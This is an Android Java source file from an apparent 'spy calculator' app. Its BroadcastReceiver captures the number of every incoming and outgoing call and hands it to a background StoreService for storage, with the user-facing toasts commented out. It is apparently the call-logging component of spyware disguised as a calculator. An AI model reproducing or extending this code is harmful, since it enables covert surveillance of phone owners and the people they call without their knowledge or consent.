package com.example.piyal.spycalculator;

import android.Manifest;
import android.app.Activity;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.nfc.TagLostException;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.widget.Toast;

import java.util.Date;

/**
 * Created by piyal on 3/8/2018.
 */
public class RequestReceiver extends BroadcastReceiver {
    String phonenumber;
    CallLogStorage db;

    @Override
    public void onReceive(Context context, Intent intent) {
       // Database db = new Database(context);
        db=new CallLogStorage(context);
        String state = intent.getStringExtra(TelephonyManager.EXTRA_STATE);
        if (state.equals(TelephonyManager.EXTRA_STATE_RINGING)) {
            phonenumber = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER);
            //Toast.makeText(context,phonenumber,Toast.LENGTH_LONG).show();
        }
        if (intent.getAction().equals("android.intent.action.NEW_OUTGOING_CALL")) {
            phonenumber = intent.getStringExtra(intent.EXTRA_PHONE_NUMBER);
            //Toast.makeText(context, number, Toast.LENGTH_LONG).show();
        }
        if (state.equals(TelephonyManager.EXTRA_STATE_IDLE)) {
            //phonenumber = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER);
            Intent myIntent = new Intent(context,StoreService.class);
            myIntent.putExtra("num",phonenumber);
            context.startService(myIntent);
           // Toast.makeText(context,phonenumber, Toast.LENGTH_LONG).show();
        }
    }

}
